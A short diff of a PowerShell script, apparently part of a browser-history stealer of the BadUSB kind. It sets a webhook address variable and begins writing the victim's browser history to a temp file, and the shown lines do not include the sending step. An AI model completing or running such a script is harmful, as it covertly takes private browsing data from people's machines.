@@ -1,6 +1,4 @@
-﻿#===================== INPUT CREDENTIALS HERE =====================
 $whuri = "$dc"
-#==================================================================
 
 $outpath = "$env:temp\history.txt"
 "Browser History    `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII
